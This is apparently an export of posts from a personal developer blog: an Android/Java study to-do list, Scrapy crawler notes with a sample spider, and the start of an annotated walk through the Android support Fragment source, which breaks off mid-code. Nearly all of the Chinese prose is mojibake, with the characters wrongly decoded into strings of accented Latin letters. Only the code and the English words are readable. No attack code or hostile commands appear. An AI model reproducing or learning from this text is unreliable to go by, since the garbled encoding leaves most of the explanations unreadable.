ä¸‹äº†ã€‚ å„ä¸ªå¹³å°ç›¸å…³çš„ç‰¹å®šçš„ä¸€äº›è®°å½•å¸ƒå±€ç›¸å…³çš„ç‚¹themeå’ŒStyle Dan lew äº‹ä»¶åˆ†å‘ï¼ŒåŠ¨ç”»ï¼Œè‡ªå®šä¹‰Viewandroidä½¿ç”¨selectableItemBackgroundçš„ä¸€äº›å‘activity transition pre and post lollipopäº‹ä»¶åˆ†å‘æµç¨‹å®‰å“åæ ‡ç³»å¸¸ç”¨æ–¹æ³•android-Ultra-pull-to-refreshåˆ†æ å†…å­˜ç®¡ç†å†…å­˜æ³„æ¼ ä»»åŠ¡ç®¡ç†ä½¿ç”¨Loaderè¿›è¡Œå¼‚æ­¥æ•°æ®æ“ä½œ V4åŒ…é‡Œé¢çš„ä¸œè¥¿ä½¿ç”¨RecyclerViewçš„Animation Android Dev Summit 2015 yigit boyarå’ŒChet Haaseè‡ªå®šä¹‰LayoutManager Dave SmithFragmentæºç è§£æ åº•å±‚åŸç†ä¸»çº¿ç¨‹çš„å·¥ä½œåŸç† Michael Bailey American Express, ä»–2016å¹´è¿˜è®²äº†LayoutInflaterçš„å·¥ä½œåŸç†vsyncåŸç†è§£é‡Šè®©serviceå¸¸é©»åå°çš„æ–¹æ³•//ä¸‹é¢è¿™äº›å·²ç»æœ‰äººå†™çš„å¾ˆå¥½äº†ï¼Œç›´æ¥çœ‹å°±å¯ä»¥äº†åº”ç”¨è¿›ç¨‹å¯åŠ¨æµç¨‹Launcherå¯åŠ¨æµç¨‹SystemServerè¿›ç¨‹å¯åŠ¨æµç¨‹Zygoteè¿›ç¨‹å¯åŠ¨æµç¨‹Apkå®‰è£…æµç¨‹Activityå¯åŠ¨æµç¨‹//è¿™ä¸ªåšä¸»å†™çš„ä¸€ç³»åˆ—åº•å±‚åˆ†æéƒ½æ¯”è¾ƒæ¸…æ¥š å›¾ç‰‡å‡ºè‡ªæœç‹Activityçš„ç”Ÿå‘½å‘¨æœŸInstant Runçš„å·¥ä½œåŸç†æ’ä»¶åŒ–åŠ è½½å°±ä¸¤ä»¶äº‹ï¼Œä»£ç åŠ è½½ï¼Œèµ„æºåŠ è½½ æ–°ç‰ˆæœ¬é€‚é…ï¼Œæ–°ç‰¹æ€§Android 7.0çš„é€‚é… å·¥å…·æ–¹æ³•æ²‰æµ¸å¼çŠ¶æ€æ replace butterKnife with databinding æ‹†è½®å­Glideæºç è§£æRxjava2çš„ä¸€äº›ç‚¹ Jake WhartonRetrofitæºç è§£æOkHttpå’ŒOkioæºç è§£æ è·Ÿjavaç›¸å…³çš„javaé›†åˆç±»çš„å®ç°åŸç†Javaçº¿ç¨‹æ± çš„ä¸€äº›ç‚¹ä½¿ç”¨AnnotationProcessorè‡ªåŠ¨ç”Ÿæˆä»£ç ç¿»è¯‘äº†ä¸€ä¸ªå°åº¦å£éŸ³çš„å…³äºjvmæ¶æ„çš„è§†é¢‘ä¸€ä¸ªJava Objectåˆ°åº•å ç”¨å¤šå°‘å†…å­˜(from java code to java heap)LruCacheçš„åŸç† å·¥å…·ä¹¦gitå¸¸ç”¨æ“ä½œæ‰‹å†Œadbå¸¸ç”¨å‘½ä»¤æ‰‹å†Œ æ‚ä¹±çš„ç‚¹javaä¸­çš„ä»»ä½•ç»†ç¢çš„ç‚¹ ToDo ListJavaç›¸å…³ [X] ç”»ä¸€ä¸‹javaçš„é›†åˆæ¡†æ¶ [X] String StringBuffer StringBuilderåŒºåˆ«(StringBufferå¾ˆå¤šæ–¹æ³•éƒ½åŠ äº†synchronized) [ ] å¤šçº¿ç¨‹å¼‚æ­¥æ–­ç‚¹ç»­ä¼ æ¡†æ¶åŸç†,åˆ©ç”¨è¯¥åŸç†åœ¨å›¾ç‰‡åŠ è½½æ¡†æ¶ä¸­çš„åº”ç”¨(MappedByteBufferæˆ–è€…RandomAccessFile) [X] å¤šçº¿ç¨‹æ–­ç‚¹ç»­ä¼ åŸç†ï¼Œå¤§æ–‡ä»¶ä¸‹è½½oomé—®é¢˜ [X] javaä½è¿ç®—ï¼ŒCollectionæ¡†æ¶ä¸­å¤šæ¬¡ç”¨åˆ°äº† [ ] gsonçš„åŸç†ï¼Œcacheä»€ä¹ˆçš„ï¼Œå¸¸è§„jsonè§£æå™¨çš„åŸç† [ ] åƒåœ¾å›æ”¶å™¨çš„åˆ†ç±»åŠä¼˜ç¼ºç‚¹ [X] ThreadLocalåŸç†åŠå¯èƒ½çš„å†…å­˜æ³„æ¼(ä¸»è¦è¿˜æ˜¯Threadçš„ç”Ÿå‘½å‘¨æœŸæ¯”è¾ƒé•¿) [ ] Understanding Dagger2â€™s generated code [X] å•ä¾‹æ¨¡å¼éœ€è¦è€ƒè™‘åˆ°jvmä¼˜åŒ–çš„é—®é¢˜ï¼ˆä¸ºä»€ä¹ˆè¦å†™ä¸¤ä¸ªsynchronizedï¼‰ [ ] javaç±»åŠ è½½æœºåˆ¶(classLoaderç›¸å…³çš„ï¼Œç±»çš„åŠ è½½é¡ºåº) [ ] Javaå››ç§å¼•ç”¨ [ ] Futureå’ŒFutureTask,CompletableFutureè¿™äº›æ€ä¹ˆç”¨ [ ]åå°„ [ ] javaå †å’Œæ ˆçš„åŒºåˆ«ï¼Œå¦‚ä½•åˆ¤æ–­å †æ ˆä¸Šçš„å¯¹è±¡æ­»æ²¡æ­» [ ] è‡ªå·±å†™ä¸€ä¸ªä¸€éƒ¨å›¾ç‰‡åŠ è½½æ¡†æ¶ï¼Œå¹¶å‘å›¾åƒæ»¤é•œæ¡†æ¶ [ ] try catch finallyåˆ°åº•ä¼šä¸ä¼šæ‰§è¡Œ [ ] å¹¶å‘ç¼–ç¨‹ï¼Œjava.util.concurrenté‡Œé¢çš„ç±»ç†Ÿç»ƒæŒæ¡ï¼Œç²—ç•¥äº†è§£åŸç† [ ]å†™ä¸€ä¸ªç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹ [X] HashMapå’ŒconrrentHashmapåŒºåˆ«(åˆ†æ®µé”æ¯”è¾ƒéš¾)Segementåˆ†æ®µï¼Œè·å–sizeçš„æ—¶å€™å…ˆä¹è§‚ï¼Œç„¶åæ‚²è§‚ [ ] javaçš„åŒ…ç»“æ„ï¼šjava.lang(Languageæ ¸å¿ƒç±»);java.io(I/Oç›¸å…³);java.util(åŒ…å«collectionå’Œconcurrent);java.nio(å¦ä¸€ç§I/O);java.net(ç½‘ç»œæ“ä½œ) [ ] é¢è¯•é•¿è°ˆé—®é¢˜ [ ] jvmå­—èŠ‚ç çœ‹å‡½æ•°è°ƒç”¨é“¾æ¥ï¼ŒJit for dummies [ ] OkHttpè·‘åˆ†githubä»¥åŠä½œè€…çš„Gplusï¼Œä»¥åŠå¤–å›½äººåšçš„High-Concurrency HTTP Clients on the JVMï¼Œçº¯å±å¥½ç©ã€‚ [ ] æŒ‡ä»¤é‡æ’åºï¼Œå†…å­˜æ …æ ï¼ŒJVMåƒåœ¾å›æ”¶æœºåˆ¶ï¼Œä½•æ—¶è§¦å‘MinorGC [ ] Edenå’ŒSurvivorçš„æ¯”ä¾‹åˆ†é…ç­‰ [ ] Gsonä¸»è¦çš„ä»£ç åœ¨JsonWriteré‡Œé¢ï¼Œæ‰“å‡ ä¸ªæ–­ç‚¹å³å¯ã€‚gsonè¿™ç±»parserçš„åŠ£åŠ¿å°±åœ¨äºallocating a bounch of String(array) and throw them awayã€‚ [ ] ç±»åŠ è½½æœºåˆ¶å’Œæ—¶åº Androidç›¸å…³ [ ] åœ¨çº¿æŸ¥çœ‹AOSPæºç çš„æœ€å¥½ç½‘ç«™ [ ] AppCompatæºç è§£æ [ ] ContentProviderçš„å¯åŠ¨è¿‡ç¨‹ [ ] IPCï¼ŒBinderåŸç†Binderå­¦ä¹ æŒ‡å— [ ] Android Internals [ ] cookieå­˜å‚¨ä½ç½®(data/data/package_name/app_WebView/Cookies.db),dbå­˜å‚¨ä½ç½® [ ] Binderçš„åŸç†ï¼ŒBinderé‡Œé¢å¼•ç”¨è®¡æ•°çš„åŸç†ï¼ŒBinderåº•å±‚ä¸ºä»€ä¹ˆç”¨çº¢é»‘æ ‘ [X] æ‹†ButterKnife [X] onSaveInstance,ä¸ä»…ä»…æ˜¯Activity,Fragmentï¼ŒViewä¸­ä¹Ÿæœ‰ï¼Œå…·ä½“å®ç°åŸç†ã€‚Viewä¸€å®šè¦æœ‰id(åœ¨View.dispatchSaveInstanceStateä¸­åˆ¤æ–­äº†idä¸ä¸º-1).[ç»§æ‰¿BaseSavedState] [X] çƒ­ä¿®å¤æ¡†æ¶åŸç† Androidåº”ç”¨ç¨‹åºèµ„æºçš„ç¼–è¯‘å’Œæ‰“åŒ…è¿‡ç¨‹åˆ†æ [ ] WebView JSäº¤äº’ï¼ŒWebViewå­˜åœ¨çš„æ¼æ´,é€šè¿‡åå°„å¯çœ‹å¯èƒ½å­˜åœ¨çš„å®‰å…¨é—®é¢˜ä»¥åŠCä»£ç  [ ] Mediaç›¸å…³ï¼Œè§†é¢‘æ’­æ”¾etcï¼Œç›¸æœºï¼Œæ»¤é•œç­‰.Demo [X] FFMpegï¼ŒIjkPlayerï¼Œå¼¹å¹• [X] using protobuf on android [ ] binderçº¿ç¨‹æ± è¢«å æ»¡(é»˜è®¤æœ€å¤š15æ¡çº¿ç¨‹) [ ] UI Toolkitæºç è§£æ(android.widgetåŒ…ä¸‹é¢çš„) [X] ViewPagerçš„åŸç†ï¼Œä½œè€…Adam Powell [ ] Viewçš„æºç , Viewçš„ç»˜åˆ¶åŸç†(å¾€displayListé‚£è¾¹é ) [ ] ViewGroupæºç  [X] FrameLayout [X] LinearLayout(ä¸»è¦ä»£ç åœ¨measureHorizontal,layoutHorizontal) [ ] RelativeLayout [X] PopupWindow(api24ä»¥ä¸Šçš„æ·±å‘ç½‘ä¸Šä¹Ÿæœ‰è§£å†³æ–¹æ³•) [X] Dialog [X] ImageView(onMeasureä¸»è¦æ˜¯å°Šé‡drawableçš„aspect ratio)setImageResourceå‰åå›¾ç‰‡å¤§å°ä¸ä¸€è‡´ä¼šæœ‰äº›é—®é¢˜ [ ] TextView(super complicated) [X] ScrollView(ä¸åˆ°2000è¡Œï¼Œæ»‘åŠ¨æ˜¯åœ¨onTouchEventé‡Œé¢ä¿®æ”¹mScrollYå®ç°çš„ï¼Œè€ŒmScrollYä¼šåœ¨Viewçš„drawé‡Œé¢å»translateä¸€ä¸‹canvasï¼Œæ‰€ä»¥ScrollViewå°±æ˜¯è¿™ä¹ˆæ»‘åŠ¨çš„) [ ] NestedScrollView [ ] ListViewåŸç†,åŠ è½½ä¼˜åŒ– [ ] RecyclerViewï¼ˆè¿™è´§æœ€æ—©çš„æ—¶å€™9Kè¡Œï¼Œç°åœ¨å¥½åƒ1.2Wè¡Œã€‚prefetcherä»€ä¹ˆçš„ï¼Œæ»‘åŠ¨è¿‡ç¨‹ä¸­ä¸å»åŠ è½½å›¾ç‰‡ï¼Œå‚è€ƒæˆ‘å†™çš„Glideç¬”è®°ï¼‰ [ ] å±æ€§åŠ¨ç”»æ®è¯´ç”¨äº†åå°„ï¼Œæºç è§£æ [ ] Aospä¸­çš„launcheråœ°å€Launcher3ï¼Œç½‘ä¸Šåˆ†æçš„ä¹Ÿå¾ˆå¤š [X] Contextæ˜¯ä»€ä¹ˆ [ ]Android Viewçš„æ˜¾ç¤ºæ¡†æ¶åŸç†ï¼Œè®²çš„æ¯”è¾ƒå…¨ [X] ç¾å›¢é‚£ä¸ªWalle è¿˜æ˜¯è¦ç©ç©çš„ [X] Androidç”Ÿå‘½å‘¨æœŸåœ¨ä¸åŒç‰ˆæœ¬çš„è¡¨ç°å½¢å¼æœ‰äº›onXXXåœ¨é«˜ç‰ˆæœ¬ä¸ä¼šè°ƒï¼ŒåŸå› æ˜¯HoneyCombä¹‹åå¯¹Activity LifeCycleè¿›è¡Œäº†æ”¹åŠ¨ [ ] è¦ä¸æ˜¯Jake Whartonåœ¨DroidConNYC2017ä¸Šæåˆ°ï¼Œè¿˜ä¸çŸ¥é“æœ‰v4åŒ…é‡Œé¢æœ‰AtomicFileè¿™ç©æ„ [X] LocalBroadCastManagerå¥½åƒæ˜¯åŸºäºhandlerå®ç°çš„ [ ] armeabiv,arm64-v8aç­‰é—®é¢˜Android è®¾å¤‡çš„CPUç±»å‹(é€šå¸¸ç§°ä¸ºâ€ABIsâ€) [ ] Romain Guyæåˆ°äº†android asset atlasï¼Œé¡ºå¸¦çœ‹ä¸‹ZygotoInit.preloadDrawableçš„å®šä¹‰åœ¨com.android.internal.R.array.preloadingdrawables [ ] Zygoteè¿›ç¨‹å¯åŠ¨æµç¨‹ [X] SystemServerè¿›ç¨‹å¯åŠ¨æµç¨‹ [ ] Launcherå¯åŠ¨æµç¨‹ Android åº”ç”¨ç‚¹å‡»å›¾æ ‡åˆ°Activityç•Œé¢æ˜¾ç¤ºçš„è¿‡ç¨‹åˆ†æ Androidé¢è¯•é¢˜æ±‡æ€» [X] SurfaceViewï¼ŒTextureViewä»å…¥é—¨åˆ°è§£æ [ ] LeakCanaryçš„åŸç†å°±æ˜¯registerActivityLifecycleCallbacks,åœ¨onDestoryçš„æ—¶å€™ï¼Œæ£€æŸ¥æœ‰æ²¡æœ‰è¯¥é‡Šæ”¾æ²¡æœ‰é‡Šæ”¾çš„ä¸œè¥¿ï¼Œå…·ä½“çš„Pierre-Yves Ricauåœ¨Droidcon NYC 2015 - Detect all memory leaks with LeakCanary! éƒ½è¯´è¿‡äº†ã€‚ [ ] Android watchdog [ ]åŠ ä¸Šä¸€ä¸ªæ”¯æŒå¤šè¿›ç¨‹çš„SharedPreference Managerå§ï¼Œå·®ç‚¹å¿˜äº†ã€‚ Studioé‡Œé¢çœ‹æºç ï¼Œfind usageæ²¡æœ‰çš„è¯ï¼Œfind in path , choose android sdk Linuxç›¸å…³ [X] linuxè¿›ç¨‹é—´é€šä¿¡æ–¹å¼æœ‰å“ªäº›ï¼ˆä¿¡å·é‡è¿™ç§ï¼‰ [X] Linux command extended [X] æ­å»ºmailæœåŠ¡ [x] win10åŠ ubuntuåŒç³»ç»Ÿå®‰è£…[å¦‚æœä¸éœ€è¦äº†ç›´æ¥åˆ åˆ†åŒºï¼Œåˆ é™¤å¼•å¯¼å³å¯] [x]win10 è£…ubuntuæœ‰æ—¶å€™å¤±è´¥æ˜¯å› ä¸ºåˆ é™¤äº†Cç›˜çš„ä¸€ä¸ªæ–‡ä»¶å¤¹å‚è€ƒ ç½‘ç»œé€šä¿¡ [X] TCP UDPçš„ä¸åŒ TCPä¸‰æ¬¡æ¡æ‰‹ï¼ŒwireSharkæŠ“åŒ…,æŠ“ä¸€ä¸ªAppçš„åŒ…ï¼Œæ¨¡æ‹Ÿè¯·æ±‚ [X] å¦‚ä½•ç»´æŒä¸€ä¸ªé•¿è¿æ¥ [ ] ç‚¹å‡»ä¸€ä¸ªç½‘å€åº•å±‚ç»å†å“ªäº›è¿‡ç¨‹ [X] ffmpegå‚è€ƒæ•™ç¨‹ Gradleç›¸å…³ [ ]å†™ä¸€äº›DSLå§Old Driver [X] Gradleä¸‹è½½çš„cacheéƒ½æ”¾åœ¨Cç›˜äº†ï¼Œé—®é¢˜æ˜¯Cç›˜å“ªé‡Œï¼Œèƒ½åˆ å—ï¼ŒCç›˜å¿«ä¸å¤Ÿç”¨äº† Python [ ] sending mail via Flask [X] bootstrap integration æ•°æ®åº“ç›¸å…³ [X] MySqlä»å…¥é—¨åˆ°åˆ åº“è·‘è·¯ [ ] Realmçš„ä¼˜ç‚¹ Cè¯­è¨€ä»å…¥é—¨åˆ°æ”¾å¼ƒ [X] åŠ è½½ffmpegéœ€è¦ï¼Œä¸å¾—ä¸å­¦ffmpegæ•™ç¨‹ æ•°æ®ç»“æ„ï¼Œç®—æ³•(æ³¨æ„ï¼Œä¸å€¼å¾—æ·±ç©¶) [ ] æ•°æ®ç»“æ„ï¼Œæ“ä½œç³»ç»Ÿ [X] ç¼–ç ï¼Œåº•å±‚äºŒè¿›åˆ¶ [X] äºŒåˆ†æ³•æŸ¥æ‰¾ï¼Œæ’åºï¼Œå†’æ³¡ï¼Œå¤æ‚åº¦ [ ] æ•°ç»„è·Ÿé“¾è¡¨åŒºåˆ«,æ•°ç»„è·Ÿé“¾è¡¨æ’åºæ—¶åŒºåˆ«,æ•°ç»„è·Ÿé“¾è¡¨æ’åºæ—¶åŒºåˆ« [ ] å…«å¤§æ’åºç®—æ³• [ ] ç®—æ³•åˆ·é¢˜ç½‘ç«™å‰‘æŒ‡offer,leetcode ä¸€äº›ç²¾å½©çš„çš„æ¼”è®²Droidcon Montreal Jake Wharton - A Few Ok LibrariesAdvanced Scrolling Techniques on AndroidAndroid Graphics Performance the cost of setAlphaDeveloping Mobile Experiences at Facebookâ€™s scale ä¸€äº›æœ‰åçš„äººGDEDianne HackbornJesse Wilson Good ReadingAndroid Source codeProject Butter and other stuffSurfaceFlinger ä¸€äº›åˆ—å…¥çš„è§„åˆ’çš„æƒ³æ³• å¤šçº¿ç¨‹ä¸‹è½½å®ä¾‹ è‡ªå·±å†™ä¸€ä¸ªImageLoader(ä¸»è¦æ˜¯å¤šçº¿ç¨‹åŒæ­¥çš„é—®é¢˜,queue) å¯¹äºAndroidæ¥è¯´ï¼Œå¹³å°æŠ€æœ¯å‘å±•ç›¸å¯¹ç¼“æ…¢ï¼Œè¿™æ˜¯è·Ÿå‰ç«¯æ¯”ã€‚","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"Scrappyæ¡†æ¶å­¦ä¹ ç¬”è®°","date":"2017-07-12T08:37:55.000Z","path":"2017/07/12/2017-07-12-scrapy-notes/","text":"Scrappyæ¡†æ¶å­¦ä¹ é¦–å…ˆå»ºè®®å®‰è£…virtualenvï¼Œåœ¨envä¸­è¿›è¡Œæ“ä½œã€‚ pip install Scrappy æŠ¥é”™ error: Microsoft Visual C++ 14.0 is required. Get it with â€œMicrosoft Visual C++ Build Toolsâ€: http://landinghub.visualstudio.com/visual-cpp-build-toolsè§£å†³åŠæ³•æ˜¯å®‰è£…vs,4ä¸ªGBå·¦å³ã€‚ã€‚ã€‚ã€‚ ä»¥ä¸‹å¼€å§‹åœ¨å‘½ä»¤è¡Œä¸­æ“ä½œï¼šå®‰è£…å®Œæ¯•åï¼Œé¦–å…ˆåˆ›å»ºscrapy é¡¹ç›® scrapy startproject tutorial #åˆ›å»ºä¸€ä¸ªprojectã€‚ä¼šç”Ÿæˆä¸€ä¸ªtutorialçš„æ–‡ä»¶å¤¹ï¼Œåœ¨tutorial/spidersæ–‡ä»¶å¤¹ä¸­æ–°å»ºä¸€ä¸ªquotes_spider.py å‚è€ƒScrapyæ•™ç¨‹ import scrapy class QuotesSpider(scrapy.Spider): name = &quot;quotes&quot; def start_requests(self): urls = [ &#39;http://quotes.toscrape.com/page/1/&#39;, &#39;http://quotes.toscrape.com/page/2/&#39;, ] for url in urls: yield scrapy.Request(url=url, callback=self.parse) #è¿™ä¸ªcallbackå°±æ˜¯responseæ‹‰ä¸‹æ¥ä¹‹åçš„è§£æè¿‡ç¨‹ #ä¸‹é¢çš„è¿™ä¸ªåšæ³•åªæ˜¯æŠŠresponseå†™åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œé€šå¸¸è¿˜å¯ä»¥ä½¿ç”¨cssæˆ–è€…xpathè§£æè·å¾—ç›¸åº”å€¼ã€‚ def parse(self, response): page = response.url.split(&quot;/&quot;)[-2] filename = &#39;quotes-%s.html&#39; % page with open(filename, &#39;wb&#39;) as f: f.write(response.body) self.log(&#39;Saved file %s&#39; % filename) scrapy crawl quotes #å¼€å§‹çˆ¬quotes.toscrape.comçš„å†…å®¹,éœ€è¦åˆ‡æ¢åˆ°tutorialæ–‡ä»¶å¤¹ä¸‹ scrapy shell â€˜http://quotes.toscrape.com/page/1/&#39; #ä»Responseä¸­æå–æ‰€éœ€çš„å€¼ è¾“å…¥å°±èƒ½å¾—åˆ°å¤§è‡´è¿™æ ·çš„äº¤äº’ &gt;&gt;&gt; response.css(&#39;title::text&#39;).extract() [&#39;Quotes to Scrape&#39;] ç”±äºæ²¡æœ‰å®‰è£…vc2014ï¼Œåªèƒ½åœ¨virtualenvä¸­è¿è¡Œ,pycharmä¸­ä¹Ÿæ˜¯æ˜¾ç¤ºscrapyæ²¡æœ‰å®‰è£…ã€‚åªèƒ½ç”¨å‘½ä»¤è¡Œè¿è¡Œã€‚æƒ³è¦çœ‹å…·ä½“çš„å€¼éœ€è¦è¿™æ · &gt;&gt;&gt; response.css(&#39;title::text&#39;).extract_first() &#39;Quotes to Scrape&#39; &gt;&gt;&gt; response.css(&#39;title::text&#39;).re(r&#39;Quotes.*&#39;) #è¿™é‡Œæ˜¯æ­£åˆ™äº† [&#39;Quotes to Scrape&#39;] #æˆ–è€…ä½¿ç”¨xpath &gt;&gt;&gt; response.xpath(&#39;//title/text()&#39;).extract_first() &#39;Quotes to Scrape&#39; å¤„ç†ç™»å½•è¯·æ±‚ï¼ŒafterLoginç½‘ç«™ç™»å½•å¤šæ•°éœ€è¦æäº¤ä¸€ä¸ªè¡¨å•ï¼ˆDictï¼‰ formadata = {â€˜userNameâ€™: â€˜Bobâ€™,â€™pwdâ€™ï¼š123456}ä¸­é—´ä»¶(MiddleWare)çš„ä½œç”¨Cookieï¼ŒUserAgentå¤„ç† setting.pyä¸­è®¾ç½®éœ€è¦çš„å‚æ•°ï¼ŒCookieé»˜è®¤æ˜¯æ¥å—çš„PipeLineæ˜¯ç”¨æ¥æŒä¹…åŒ–çš„ï¼Œä¸­é—´ä»¶ç”¨äºå¤„ç†Cookie,Ajaxç­‰ï¼Œrulesç”¨äºç­›é€‰éœ€è¦è·Ÿè¿›çš„url scrapyä¼¼ä¹æ˜¯æä¾›äº†ä¸€ä¸ªRequestç±»ï¼Œä¼ å…¥ä¸€ä¸ªurlå’Œcallbackï¼Œå¦å¤–ï¼Œé¡¹ç›®ç»“æ„åŒ…æ‹¬scrapy.cfgå’Œsetting.pyæ–‡ä»¶ï¼ŒæŠŠç½‘ç»œè¯·æ±‚çš„ç»†èŠ‚éšè—äº†ã€‚æœ€åç”Ÿæˆçš„æ–‡ä»¶æ˜¯items.csv(Comma-Separated Values)ã€‚åº”è¯¥å¯ä»¥ç»“åˆå…¶ä»–åº“å»ä½œå›¾ã€‚ 2. MongoDBå­˜å‚¨pymongoï¼Œå°±åƒnodeç¯å¢ƒä¸‹æœ‰mongooseå¯ä»¥è°ƒç”¨mongodb apiä¸€æ ·ï¼Œpythonç¯å¢ƒä¸‹ä¹Ÿæœ‰å¯¹äºçš„driver requestsçš„timeoutå¹¶ä¸æ˜¯è¯´æ•´ä¸ªè¯·æ±‚çš„æ—¶é—´é™å®šåœ¨10så†…å®Œæˆï¼Œè€Œæ˜¯åº•å±‚çš„socketè¿‡äº†10sè¿˜æ²¡æœ‰æ”¶åˆ°ä¸€ä¸ªByte. timeout is not a time limit on the entire response download; rather, an exception is raised if the server has not issued a response for timeout seconds (more precisely, if no bytes have been received on the underlying socket for timeout seconds). If no timeout is specified explicitly, requests do not time out. content-encodingçš„ä¸€äº›ç‚¹åœ¨requestä¸­æ·»åŠ äº†â€™accept-encodingâ€™:â€™gzip, deflate, brâ€™çš„headerä¹‹åï¼Œè¿”å›çš„responseå¯èƒ½æ˜¯gzipæˆ–è€…æ˜¯brå‹ç¼©çš„.è¿™æ—¶å€™å°±éœ€è¦æ ¹æ®responseä¸­çš„content-encodingæ¥å†³å®šé‡‡ç”¨ä»€ä¹ˆæ ·çš„è§£å‹ç¼©æ–¹å¼äº†ã€‚æ¯”å¦‚æ˜¯gzipçš„è¯è¦import gzipï¼Œå…¶ä»–çš„è¿˜è¦å¦å¤–importã€‚è¿™æ˜¯pythonï¼Œå½“ç„¶æ—©å°±æœ‰ç°æˆçš„å·¥å…·äº† import brotli bytecontent = brotli.decompress(response.content) ## byteï¼Œè¿˜éœ€è¦decode(&#39;utf-8&#39;) ç„¶åå¦‚æœæ˜¯jsonçš„è¯ , strcontent = bytecontent.decode(&#39;utf-8&#39;) jobj = json.loads(strcontent)","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"Fragmentæºç è§£æè®°å½•(supportLibrary 25.3.0)","date":"2017-07-12T08:37:23.000Z","path":"2017/07/12/2017-07-12-fragment-decoded/","text":"We been told Fragment itself should only trust official docs, the implementation detail are prone to any change any time, donâ€™t count on it! Fragmentæºç è§£æï¼ˆsupport Library 25.3.0ï¼‰ï¼Œä¸è¦ä»¥ä¸ºçœ‹äº†æºç å°±å¯ä»¥ä¸é¸Ÿå®˜æ–¹æ–‡æ¡£äº†ï¼Œæºç çš„å†…å®¹ç»å¸¸å˜ï¼Œåªæœ‰å®˜æ–¹çš„æ–‡æ¡£æ‰æ˜¯å¯é çš„ï¼Œè°·æ­Œä¿è¯ä¼šå®ç°çš„æ•ˆæœã€‚ 1. æ¦‚è¿°Fragmentçš„æ ¸å¿ƒç±»æœ‰è¿™å‡ ä¸ª: FragmentManager, FragmentTransaction, Fragmentã€‚è€Œäº‹å®ä¸Šå‰ä¸¤ä¸ªéƒ½æ˜¯æŠ½è±¡ç±»ï¼ŒFragmentManagerçš„å®ç°ç±»æ˜¯FragmentManagerImplï¼ŒFragmentTransactionçš„å®ç°ç±»æ˜¯BackStackRecord ä»æ—¥å¸¸ä½¿ç”¨Fragmentçš„æ–¹å¼å¼€å§‹: ((FragmentActivity) mActivity).getSupportFragmentManager() .beginTransaction().add(R.id.containerViewId,fragment).commit(); 2.FragmentTransactionåªæ˜¯å°†åŠ¨ä½œæ·»åŠ åˆ°ä¸€ä¸ªé˜Ÿåˆ—ä¸­äº†beginTransactionè·å–äº†ä¸€ä¸ªFragmentTransactionå®ä¾‹ï¼Œæ¥çœ‹addæ–¹æ³•çš„å®ç°: @Override public FragmentTransaction add(Fragment fragment, String tag) { doAddOp(0, fragment, tag, OP_ADD); return this; } @Override public FragmentTransaction add(int containerViewId, Fragment fragment) { doAddOp(containerViewId, fragment, null, OP_ADD); return this; } @Override public FragmentTransaction add(int containerViewId, Fragment fragment, String tag) { doAddOp(containerViewId, fragment, tag, OP_ADD); return this; } ä¸ç®¡æ˜¯é€šè¿‡idè¿˜æ˜¯Tagæ·»åŠ ï¼Œéƒ½æ˜¯è°ƒç”¨åŒä¸€ä¸ªæ–¹æ³•ï¼Œä¼ å‚ä¸åŒè€Œå·² private void doAddOp(int containerViewId, Fragment fragment, String tag, int opcmd) { //çœç•¥éƒ¨åˆ†ä»£ç  fragment.mFragmentManager = mManager; if (tag != null) { fragment.mTag = tag; } //æ³¨æ„ï¼Œè¿›å…¥è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™fragmentå·²ç»å®ä¾‹åŒ–äº†ï¼Œåªæ˜¯å…¶ä¸­çš„å›è°ƒæ–¹æ³•è¿˜æ²¡æœ‰å¼€å§‹è°ƒç”¨ if (containerViewId != 0) { fragment.mContainerId = fragment.mFragmentId = containerViewId; } Op op = new Op(); op.cmd = opcmd; //è¿™ä¸ªcmdå¾ˆé‡è¦ï¼Œä»£è¡¨äº†æ˜¯showã€hideã€addã€removeç­‰è¿™äº›ä¸œè¥¿ op.fragment = fragment; addOp(op); } //æ‰€æœ‰å¯èƒ½çš„æ“ä½œç»†èŠ‚éƒ½åŒ…å«åœ¨è¿™é‡Œé¢äº†ã€‚æ³¨æ„ï¼Œè¿™æ˜¯çº¿æ€§çš„ï¼ static final int OP_NULL = 0; static final int OP_ADD = 1; static final int OP_REPLACE = 2; static final int OP_REMOVE = 3; static final int OP_HIDE = 4; static final int OP_SHOW = 5; static final int OP_DETACH = 6; static final int OP_ATTACH = 7; //è¿™ä¸ªOPåŒ…è£…äº†äº†æ¯ä¸€æ¬¡æ“ä½œçš„å…·ä½“ç»†èŠ‚ã€‚ static final class Op { int cmd; Fragment fragment; int enterAnim; int exitAnim; int popEnterAnim; int popExitAnim; } void addOp(Op op) { mOps.add(op); //å¾€ä¸€ä¸ªæ™®é€šçš„ArrayListä¸­æ·»åŠ ä¸€ä¸ªop op.enterAnim = mEnterAnim; op.exitAnim = mExitAnim; op.popEnterAnim = mPopEnterAnim; op.popExitAnim = mPopExitAnim; } 3.é€šè¿‡FragmentTransaction.commitæ‰§è¡Œæ“ä½œFragmentFransactionåªæ˜¯å°†æ‰€æœ‰æ“ä½œä¿ç•™åˆ°ä¸€æ¬¡Transactionçš„ä¸€ä¸ªä»»åŠ¡é˜Ÿåˆ—(ArrayList)ä¸­äº†ã€‚çœŸæ­£çš„æ‰§è¡Œéœ€è¦æäº¤äº‹åŠ¡ï¼Œè¿™å’Œæ•°æ®åº“çš„äº‹åŠ¡å¾ˆåƒã€‚ @Override public int commit() { return commitInternal(false); } @Override public int commitAllowingStateLoss() { return commitInternal(true); } //ä¸Šé¢ä¸¤ä¸ªå‡½æ•°çš„è¿”å›å€¼ Returns the identifier of this transaction&#39;s back stack entry, if addToBackStack(String)} had been called. Otherwise, returns a negative number. å¦‚æœè°ƒç”¨è¿‡addToBackStackçš„è¯ï¼Œè¿”å›è¿™æ¬¡æ“ä½œåœ¨æ“ä½œæ ˆä¸Šçš„æ ‡è¯†ç¬¦ã€‚å¦åˆ™è¿”å›è´Ÿæ•°ã€‚ int commitInternal(boolean allowStateLoss) { if (mCommitted) throw new IllegalStateException(&quot;commit already called&quot;); if (FragmentManagerImpl.DEBUG) { Log.v(TAG, &quot;Commit: &quot; + this); LogWriter logw = new LogWriter(TAG); 